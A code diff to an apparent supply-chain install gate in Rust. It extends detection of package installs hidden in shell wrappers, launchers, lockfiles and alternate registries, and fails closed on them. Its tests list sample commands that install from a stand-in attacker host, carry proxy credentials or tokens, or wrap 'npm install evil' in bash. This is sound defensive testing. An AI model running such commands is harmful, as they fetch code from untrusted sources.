@@ -640,6 +640,8 @@ fn scan_balanced_paren(cmd: &str, start: usize) -> usize {
 /// command-substitution bodies `$(…)`, and backtick bodies. Returned strings
 /// are the *literal inner command text* — the caller re-runs the full
 /// install detector on each one to close the wrapped-install bypass class.
+/// A shell-tokenisation error is returned to the caller so it can emit a
+/// synthetic unvettable finding instead of silently dropping wrapper bodies.
 ///
 /// Representation choice: a flat `Vec<String>` of inner commands rather than
 /// in-band tokens. This keeps the offset/dedup contract of `shell_tokens`
@@ -647,7 +649,7 @@ fn scan_balanced_paren(cmd: &str, start: usize) -> usize {
 /// to a single explicit pass in `detect_installs`. Each segment is treated as
 /// an independent command — no offset is needed because spans in the inner
 /// command would not align with the outer claimed-span dedup anyway.
-fn extract_recursion_segments(cmd: &str) -> Vec<String> {
+fn extract_recursion_segments(cmd: &str) -> std::result::Result<Vec<String>, &'static str> {
     let mut out = Vec::new();
     let bytes = cmd.as_bytes();
     let mut i = 0;
@@ -748,9 +750,7 @@ fn extract_recursion_segments(cmd: &str) -> Vec<String> {
     // character is `c`. The next token after the matching cluster is the
     // command body. A long option (`--`) or non-option token before `-c`
     // ends the scan without recursion.
-    let Ok(toks) = shell_tokens(cmd) else {
-        return out;
-    };
+    let toks = shell_tokens(cmd)?;
     let mut idx = 0;
     while idx < toks.len() {
         let head = installer_basename(toks[idx].1.as_str()).to_ascii_lowercase();
@@ -790,7 +790,7 @@ fn extract_recursion_segments(cmd: &str) -> Vec<String> {
         idx += 1;
     }
 
-    out
+    Ok(out)
 }
 
 /// Return a same-length copy of `cmd` where shell operator characters
@@ -1055,6 +1055,7 @@ fn mask_data_utility_segments(cmd: &str) -> String {
 /// - `uv install <pkg>` / `uv add <pkg>` / `uv pip install <pkg>`
 /// - `poetry add <pkg>`
 /// - `pipx install <pkg>`
+/// - `npx <pkg>` / `pnpx <pkg>` / `yarn dlx <pkg>` (local-only fail-closed)
 /// - local-classification / fail-closed additions from lab #144:
 ///   `bun install|add|i <pkg>`, `pdm add <pkg>`, `pipenv install <pkg>`,
 ///   `conda install|create ...`, `mamba install|create ...`,
@@ -1277,7 +1278,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
             // masking only ever rewrites bytes inside quoted regions to
             // spaces, so the offsets are identical in both strings.
             let arg_string = cap.get(1).map(|m| &cmd[m.start()..m.end()]).unwrap_or("");
-            let (pkgs, has_editable, lockfile_source) = parse_package_args(arg_string, manager);
+            let (mut pkgs, has_editable, lockfile_source) = parse_package_args(arg_string, manager);
             // Local-only added surfaces: package names may parse, but without
             // the repo's requested Mongo/local-model package-intelligence path
             // we must not query remote registries/OSV. Drop parsed packages so
@@ -1290,6 +1291,12 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
                     unvettable: Some(caveat.to_string()),
                 });
                 continue;
+            }
+            if lockfile_source.is_some() {
+                // A source/config caveat describes the install as one
+                // unvettable unit. Retaining separately parsed names creates
+                // a hybrid that downstream code can mistake for vettable.
+                pkgs.clear();
             }
             // An install verb was detected. If no package is nameable AND no
             // editable token is present, the install set is unvettable
@@ -1339,7 +1346,20 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
     // then auto-allow at the gate. The fix: at the cap, if there are still
     // unresolved recursion segments, surface a synthetic Unvettable
     // ParsedInstall so the caller fails CLOSED (Verdict::Ask) instead.
-    let recursion_segments = extract_recursion_segments(cmd_raw);
+    let recursion_segments = match extract_recursion_segments(cmd_raw) {
+        Ok(segments) => segments,
+        Err(error) => {
+            out.push(ParsedInstall {
+                ecosystem: Ecosystem::Unknown,
+                packages: Vec::new(),
+                has_editable: false,
+                unvettable: Some(format!(
+                    "recursion segment tokenisation failed ({error}); nested shell payloads cannot be vetted"
+                )),
+            });
+            Vec::new()
+        }
+    };
     let process_segments = match crate::discover::lexer::extract_process_substitutions(cmd_raw) {
         Ok(segments) => segments,
         Err(()) => {
@@ -1429,6 +1449,11 @@ struct TokenInstallSpec {
     local_only_caveat: Option<&'static str>,
 }
 
+const PACKAGE_LAUNCHER_CAVEAT: &str =
+    "npx/dlx pulls arbitrary packages; not vettable by this gate yet";
+const PNPM_LOCKFILE_CAVEAT: &str =
+    "pnpm lockfile installs resolve from pnpm-lock.yaml; not vettable by this gate yet";
+
 fn normalised_manager(token: &str) -> Option<String> {
     let manager = installer_basename(token).to_ascii_lowercase();
     let pip_suffix = manager.strip_prefix("pip");
@@ -1443,7 +1468,9 @@ fn normalised_manager(token: &str) -> Option<String> {
     matches!(
         manager.as_str(),
         "npm"
+            | "npx"
             | "pnpm"
+            | "pnpx"
             | "yarn"
             | "bun"
             | "uv"
@@ -1531,9 +1558,14 @@ fn manager_option_takes_value(manager: &str, flag: &str) -> bool {
                 | "--index"
                 | "--default-index"
                 | "--index-url"
+                | "-i"
                 | "--extra-index-url"
                 | "--find-links"
                 | "-f"
+                | "--trusted-host"
+                | "--cert"
+                | "--client-cert"
+                | "--proxy"
         ),
         "poetry" => matches!(flag, "--directory" | "-C" | "--project" | "-P"),
         "pipx" => matches!(flag, "--global" | "--pip-args" | "--python"),
@@ -1677,25 +1709,25 @@ fn is_default_registry(manager: &str, value: Option<&str>) -> bool {
     let value = value.trim_end_matches('/');
     match manager {
         "npm" | "pnpm" | "yarn" | "bun" => value.eq_ignore_ascii_case("https://registry.npmjs.org"),
-        "pip" | "uv" => value.eq_ignore_ascii_case("https://pypi.org/simple"),
         _ => false,
     }
 }
 
 /// Return a credential-free explanation when a CLI option can change the
 /// source whose package is actually installed. Explicitly selecting the same
-/// public registry queried by this gate is safe; config/directory switches and
-/// alternate or additional sources are unvettable without evaluating external
-/// configuration.
+/// npm registry queried by this gate is safe. PyPI transport/index overrides,
+/// config/directory switches, and alternate or additional sources are
+/// unvettable without evaluating external configuration and trust state.
 fn source_option_unvettable_detail(
     manager: &str,
     flag: &str,
     value: Option<&str>,
 ) -> Option<String> {
+    if manager == "pnpm" && flag == "--frozen-lockfile" {
+        return Some(PNPM_LOCKFILE_CAVEAT.to_string());
+    }
     let registry_flag = matches!(manager, "npm" | "pnpm" | "yarn" | "bun") && flag == "--registry";
-    let primary_index_flag =
-        matches!(manager, "pip" | "uv") && matches!(flag, "--index-url" | "-i" | "--default-index");
-    if registry_flag || primary_index_flag {
+    if registry_flag {
         return (!is_default_registry(manager, value)).then(|| {
             format!(
                 "{manager} {flag} selects a registry the gate does not query; refusing to vet against unrelated metadata"
@@ -1710,11 +1742,27 @@ fn source_option_unvettable_detail(
         "bun" => matches!(flag, "--cwd" | "--config"),
         "pip" => matches!(
             flag,
-            "--extra-index-url" | "--find-links" | "-f" | "--no-index"
+            "--trusted-host"
+                | "--cert"
+                | "--client-cert"
+                | "--proxy"
+                | "--index-url"
+                | "-i"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
+                | "--no-index"
         ),
         "uv" => matches!(
             flag,
-            "--index"
+            "--trusted-host"
+                | "--cert"
+                | "--client-cert"
+                | "--proxy"
+                | "--index"
+                | "--default-index"
+                | "--index-url"
+                | "-i"
                 | "--extra-index-url"
                 | "--find-links"
                 | "-f"
@@ -1728,7 +1776,7 @@ fn source_option_unvettable_detail(
     };
     changes_source_or_config.then(|| {
         format!(
-            "{manager} {flag} can change registry/config resolution; the selected metadata source cannot be verified"
+            "{manager} {flag} can change source, transport trust, or config resolution; registry metadata cannot verify the selected artifact"
         )
     })
 }
@@ -1741,6 +1789,9 @@ fn token_install_spec(
 ) -> Option<TokenInstallSpec> {
     let word = tokens.get(idx)?.1.to_ascii_lowercase();
     let spec = match (manager, word.as_str()) {
+        ("npx" | "pnpx", package) if !package.starts_with('-') => {
+            (Ecosystem::Npm, true, Some(PACKAGE_LAUNCHER_CAVEAT))
+        }
         ("npm", "install" | "i" | "add") | ("pnpm", "install" | "i" | "add") => {
             (Ecosystem::Npm, true, None)
         }
@@ -1754,6 +1805,13 @@ fn token_install_spec(
         ),
         ("yarn", "add") => (Ecosystem::Npm, true, None),
         ("yarn", "install") => (Ecosystem::Npm, false, None),
+        ("yarn", "dlx")
+            if tokens[idx + 1..segment_end]
+                .iter()
+                .any(|(_, token)| !token.starts_with('-')) =>
+        {
+            (Ecosystem::Npm, true, Some(PACKAGE_LAUNCHER_CAVEAT))
+        }
         ("bun", "install" | "i" | "add") => (
             Ecosystem::Npm,
             true,
@@ -1989,15 +2047,24 @@ fn detect_tokenised_installs(
                 .map(|(_, token)| token.as_str())
                 .collect::<Vec<_>>()
                 .join(" ");
-            let (packages, has_editable, source_detail) = parse_package_args(&arg_string, &manager);
+            let (mut packages, has_editable, source_detail) =
+                parse_package_args(&arg_string, &manager);
+            let has_unvettable_source = source_option_detail.is_some() || source_detail.is_some();
             let parsed_detail = if packages.is_empty() && !has_editable {
                 Some(source_detail.unwrap_or_else(|| {
-                    "install resolves packages from a lockfile/requirements file the gate cannot vet"
-                        .to_string()
+                    if manager == "pnpm" {
+                        PNPM_LOCKFILE_CAVEAT.to_string()
+                    } else {
+                        "install resolves packages from a lockfile/requirements file the gate cannot vet"
+                            .to_string()
+                    }
                 }))
             } else {
                 source_detail
             };
+            if has_unvettable_source {
+                packages.clear();
+            }
             out.push(ParsedInstall {
                 ecosystem: spec.ecosystem,
                 packages,
@@ -2213,23 +2280,26 @@ fn detect_bare_lockfile_installs(
                 // if another detector is added after this one.
                 let verb_end = tokens[verb_span_end_idx].0 + tokens[verb_span_end_idx].1.len();
                 claimed.insert(*start, verb_end);
+                let local_only_caveat = (tok_norm == "pnpm").then_some(PNPM_LOCKFILE_CAVEAT);
                 out.push(ParsedInstall {
                     ecosystem: eco,
                     packages: Vec::new(),
                     has_editable: false,
-                    unvettable: Some(match eco {
-                        Ecosystem::Npm => "bare lockfile install — pulls the dependency tree \
-                                           from package-lock.json/pnpm-lock.yaml/yarn.lock/bun.lockb \
-                                           the gate cannot vet"
-                            .to_string(),
-                        Ecosystem::Pypi => "bare lockfile install — pulls the dependency tree \
-                                            from poetry.lock/uv.lock/pdm.lock/Pipfile.lock/pyproject.toml \
-                                            the gate cannot vet"
-                            .to_string(),
-                        Ecosystem::Unknown => "bare lockfile install — ecosystem could not be \
-                                               resolved; the gate cannot vet"
-                            .to_string(),
-                    }),
+                    unvettable: Some(local_only_caveat.map(str::to_string).unwrap_or_else(
+                        || match eco {
+                            Ecosystem::Npm => "bare lockfile install — pulls the dependency tree \
+                                               from package-lock.json/pnpm-lock.yaml/yarn.lock/bun.lockb \
+                                               the gate cannot vet"
+                                .to_string(),
+                            Ecosystem::Pypi => "bare lockfile install — pulls the dependency tree \
+                                                from poetry.lock/uv.lock/pdm.lock/Pipfile.lock/pyproject.toml \
+                                                the gate cannot vet"
+                                .to_string(),
+                            Ecosystem::Unknown => "bare lockfile install — ecosystem could not be \
+                                                   resolved; the gate cannot vet"
+                                .to_string(),
+                        },
+                    )),
                 });
             }
         }
@@ -2418,7 +2488,11 @@ fn parse_package_args(s: &str, manager: &str) -> ParsedPackageArgs {
 }
 
 fn is_remote_package_source(token: &str) -> bool {
-    let lower = trim_shell_token(token).to_ascii_lowercase();
+    let token = trim_shell_token(token);
+    if sanitise_scp_source(token).is_some() {
+        return true;
+    }
+    let lower = token.to_ascii_lowercase();
     [
         "http://",
         "https://",
@@ -2440,14 +2514,18 @@ fn is_remote_package_source(token: &str) -> bool {
 
 fn sanitise_scp_source(target: &str) -> Option<String> {
     let (user, location) = target.split_once('@')?;
-    if !user.eq_ignore_ascii_case("git") {
+    if user.is_empty()
+        || user.chars().any(|character| {
+            character.is_whitespace() || matches!(character, '/' | '\\' | ':' | '@')
+        })
+    {
         return None;
     }
     let (host, path) = location.split_once(':')?;
     if host.is_empty()
         || host
             .chars()
-            .any(|character| character.is_whitespace() || matches!(character, '/' | '\\'))
+            .any(|character| character.is_whitespace() || matches!(character, '/' | '\\' | '@'))
     {
         return None;
     }
@@ -4447,10 +4525,10 @@ mod tests {
     }
 
     #[test]
-    fn skip_flag_args() {
+    fn requirements_flag_is_one_unvettable_unit() {
         let v = detect_installs("pip install -r requirements.txt foo");
-        // -r and requirements.txt should both be skipped; only `foo` remains
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
     }
 
     #[test]
@@ -4525,23 +4603,26 @@ mod tests {
     }
 
     #[test]
-    fn pip_value_consuming_flag_trusted_host() {
+    fn pip_trusted_host_is_unvettable_without_leaking_the_host() {
         let v = detect_installs("pip install --trusted-host pypi.org foo");
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
+        assert!(!format!("{v:?}").contains("pypi.org"));
     }
 
     #[test]
-    fn pip_value_consuming_flag_extra_index_url() {
+    fn pip_extra_index_url_is_unvettable_without_leaking_the_url() {
         let v = detect_installs("pip install --extra-index-url https://pkg.example.org/simple foo");
-        let ns = names(&v[0]);
-        assert!(ns.contains(&"foo"));
-        assert!(!ns.iter().any(|n| n.starts_with("http")));
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
+        assert!(!format!("{v:?}").contains("pkg.example.org"));
     }
 
     #[test]
-    fn pip_value_consuming_flag_find_links() {
+    fn pip_find_links_is_one_unvettable_unit() {
         let v = detect_installs("pip install --find-links /tmp/wheels foo");
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
     }
 
     #[test]
@@ -4760,14 +4841,12 @@ mod tests {
     }
 
     #[test]
-    fn requirements_install_with_named_pkg_keeps_name_and_stays_unvettable() {
-        // `pip install -r req.txt foo` names `foo` (vettable) AND pulls the
-        // requirements file contents (unvettable). The named package must
-        // still be resolved, but the install must remain flagged unvettable
-        // because the `-r` file is not enumerable — fail closed (#111 G1).
+    fn requirements_install_with_named_pkg_is_one_unvettable_unit() {
+        // The requirements file makes the whole install unvettable. Do not
+        // retain `foo` as a hybrid vettable package alongside that caveat.
         let v = detect_installs("pip install -r requirements.txt foo");
         assert_eq!(v.len(), 1);
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
         assert!(
             v[0].unvettable.is_some(),
             "a -r requirements file alongside a named package must still flag unvettable"
@@ -4883,12 +4962,10 @@ mod tests {
     }
 
     #[test]
-    fn pip_install_attached_requirement_with_named_pkg_keeps_name() {
-        // `--requirement=req.txt foo` names `foo` AND pulls the requirements
-        // file — name resolved, install still flagged unvettable.
+    fn pip_install_attached_requirement_with_named_pkg_is_one_unvettable_unit() {
         let v = detect_installs("pip install --requirement=req.txt foo");
         assert_eq!(v.len(), 1);
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
         assert!(v[0].unvettable.is_some());
     }
 
@@ -5770,7 +5847,8 @@ mod tests {
     fn issue_227_parses_manager_global_options_before_install() {
         let npm = detect_installs("npm --prefix /tmp install evil");
         assert_eq!(npm.len(), 1, "npm --prefix must not hide install");
-        assert_eq!(names(&npm[0]), vec!["evil"]);
+        assert!(npm[0].packages.is_empty());
+        assert!(npm[0].unvettable.is_some());
 
         let pip = detect_installs("pip --isolated install evil");
         assert_eq!(pip.len(), 1, "pip --isolated must not hide install");
@@ -6048,18 +6126,11 @@ mod tests {
     }
 
     #[test]
-    fn round_2_explicit_default_registry_remains_allowable() {
-        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
+    fn round_2_explicit_default_npm_registry_remains_allowable() {
+        let config = round_2_allowlisted_config(&["left-pad"]);
         assert!(matches!(
             check_with_config(
                 "npm install --registry=https://registry.npmjs.org left-pad",
-                &config
-            ),
-            Verdict::Allow
-        ));
-        assert!(matches!(
-            check_with_config(
-                "pip install --index-url=https://pypi.org/simple requests",
                 &config
             ),
             Verdict::Allow
@@ -6121,7 +6192,6 @@ mod tests {
             "npm --save install left-pad",
             "npm --save-dev install left-pad",
             "npm --production install left-pad",
-            "pnpm --frozen-lockfile install left-pad",
             "pip --user install requests",
             "pip -U install requests",
             "pip --upgrade install requests",
@@ -6196,6 +6266,191 @@ mod tests {
         let over_limit = format!("cat <({})", "x".repeat(65 * 1024));
         let installs = detect_installs(&over_limit);
         assert!(installs.iter().any(|install| install.unvettable.is_some()));
+    }
+
+    #[test]
+    fn round_3_pip_and_uv_network_trust_options_fail_closed_and_redact_values() {
+        let config = round_2_allowlisted_config(&["requests"]);
+        for command in [
+            "pip install requests --trusted-host attacker.example",
+            "pip install requests --cert /tmp/round3-cert.pem",
+            "pip install requests --client-cert /tmp/round3-client.pem",
+            "pip install requests --proxy http://user:round3-secret@attacker.example",
+            "pip install requests --index-url=https://pypi.org/simple",
+            "pip install requests --extra-index-url https://attacker.example/simple",
+            "pip install requests --find-links https://attacker.example/wheels",
+            "pip --trusted-host attacker.example install requests",
+            "uv pip install requests --trusted-host attacker.example",
+            "uv pip install requests --cert /tmp/round3-cert.pem",
+            "uv pip install requests --client-cert /tmp/round3-client.pem",
+            "uv pip install requests --proxy http://user:round3-secret@attacker.example",
+            "uv pip install requests --index-url=https://pypi.org/simple",
+            "uv pip install requests --extra-index-url https://attacker.example/simple",
+            "uv pip install requests --find-links https://attacker.example/wheels",
+            "uv --trusted-host attacker.example install requests",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1, "missing network-trust option: {command}");
+            assert!(
+                installs[0].unvettable.is_some(),
+                "network-trust option must fail closed: {command} -> {installs:?}"
+            );
+            assert!(
+                installs[0].packages.is_empty(),
+                "unvettable source must be one unit: {command} -> {installs:?}"
+            );
+            let rendered = format!("{installs:?}");
+            assert!(
+                !rendered.contains("attacker.example"),
+                "host leaked: {rendered}"
+            );
+            assert!(
+                !rendered.contains("round3-"),
+                "option value leaked: {rendered}"
+            );
+            assert!(
+                matches!(check_with_config(command, &config), Verdict::Ask(_)),
+                "allowlisted package must not bypass source uncertainty: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn round_3_recursion_tokenisation_failure_has_a_dedicated_fail_closed_finding() {
+        let installs = detect_installs("bash -lc 'npm install evil");
+        assert!(
+            installs.iter().any(|install| {
+                install
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("recursion segment tokenisation failed"))
+            }),
+            "recursion extraction errors must not be silently dropped: {installs:?}"
+        );
+    }
+
+    #[test]
+    fn round_3_balanced_shell_wrapper_preserves_benign_allow() {
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        assert!(matches!(
+            check_with_config("bash -lc 'npm install left-pad'", &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_3_package_launchers_fail_closed_without_overblocking_diagnostics() {
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        for command in [
+            "npx create-react-app foo",
+            "pnpx create-react-app foo",
+            "yarn dlx create-react-app foo",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1, "launcher escaped detection: {command}");
+            assert!(installs[0].packages.is_empty());
+            assert!(
+                installs[0]
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("pulls arbitrary packages")),
+                "launcher needs the local-only caveat: {command} -> {installs:?}"
+            );
+            assert!(matches!(
+                check_with_config(command, &config),
+                Verdict::Ask(_)
+            ));
+        }
+
+        for command in [
+            "npx --version",
+            "pnpx --help",
+            "yarn --version",
+            "yarn dlx",
+            "yarn dlx --help",
+        ] {
+            assert!(
+                detect_installs(command).is_empty(),
+                "diagnostic launcher command over-blocked: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn round_3_pnpm_frozen_and_bare_lockfile_installs_fail_closed() {
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        for command in [
+            "pnpm install left-pad --frozen-lockfile",
+            "pnpm --frozen-lockfile install left-pad",
+            "pnpm install --frozen-lockfile",
+            "pnpm install",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1, "pnpm install escaped: {command}");
+            assert!(
+                installs[0].packages.is_empty(),
+                "hybrid finding: {installs:?}"
+            );
+            assert!(
+                installs[0].unvettable.is_some(),
+                "must fail closed: {command}"
+            );
+            assert!(
+                installs[0]
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("pnpm-lock.yaml")),
+                "pnpm lockfile install needs the local-only caveat: {installs:?}"
+            );
+            assert!(matches!(
+                check_with_config(command, &config),
+                Verdict::Ask(_)
+            ));
+        }
+
+        assert!(matches!(
+            check_with_config("pnpm install left-pad", &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_3_non_git_scp_sources_are_unvettable_and_redacted() {
+        let command = r#"pip install "alice@github.com:owner/repo.git?token=round3-supersecret""#;
+        let installs = detect_installs(command);
+        assert_eq!(installs.len(), 1);
+        assert!(installs[0].unvettable.is_some());
+        assert!(installs[0].packages.is_empty());
+        let rendered = format!("{installs:?}");
+        assert!(
+            !rendered.contains("round3-supersecret"),
+            "secret leaked: {rendered}"
+        );
+        assert!(!rendered.contains("alice@"), "userinfo leaked: {rendered}");
+
+        let config = round_2_allowlisted_config(&["@scope/pkg"]);
+        assert!(matches!(
+            check_with_config("npm install @scope/pkg", &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_3_no_index_source_caveat_clears_named_packages() {
+        for command in [
+            "pip install --no-index requests",
+            "pip install requests --no-index",
+            "uv pip install --no-index requests",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1);
+            assert!(installs[0].unvettable.is_some());
+            assert!(
+                installs[0].packages.is_empty(),
+                "source caveat must not produce a hybrid finding: {command} -> {installs:?}"
+            );
+        }
     }
 
     #[cfg(unix)]
